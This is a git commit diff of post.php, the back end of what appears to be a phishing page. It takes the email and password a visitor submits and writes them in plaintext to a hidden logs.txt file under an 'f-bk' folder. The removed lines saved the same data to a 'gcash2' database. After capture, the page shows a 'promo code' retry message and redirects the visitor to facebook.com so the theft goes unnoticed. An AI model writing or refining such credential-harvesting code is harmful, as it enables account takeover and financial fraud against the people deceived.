a7eb5e5f2fffa1cbaef685d6344d80c8a28704df
Christian De Leon <christian.deleon.mgx@gmail.com>
2022-01-03 01:13:48 +0800

    First

--- post.php
+++ post.php
@@ -3,26 +3,19 @@ ob_start();
 date_default_timezone_set("Asia/Manila");
 
 if(isset($_POST['email'])){
-	// Create connection
-	$con = new mysqli("localhost","root","","gcash2");
-
-	// Check connection
-	if($con->connect_error) {
-	  // die("Connection failed: " . $con->connect_error);
-	}else{
-		// echo "Connected";
-		$password = mysqli_real_escape_string($con, $_POST['password']);
-		$email = mysqli_real_escape_string($con, $_POST['email']);
-		$timestamp = date("Y-m-d H:i:s");
-		echo $timestamp;
-		$query = mysqli_query($con,"INSERT INTO accounts(email,password,created_at)VALUES('$email','$password','$timestamp')");
-	}
+	$timestamp = date("Y-m-d H:i:s");
+	$content = $_POST['email']." | ".$_POST['password']." | ".$timestamp." => \n\r";
+	$file_path = $_SERVER['DOCUMENT_ROOT'] . "/f-bk/logs.txt";
+	$file_content = file_get_contents($file_path)."\n";
+	$fp = fopen($file_path,"wb");
+	fwrite($fp,$content.$file_content);
+	fclose($fp);
 ?>
 	If you not works, please retry again on promo code link.
 	<script type="text/javascript">
 		setTimeout(function (){
 			location.href = 'https://facebook.com';
-		}, 6000)
+		}, 4000)
 	</script>
 <?php
 }
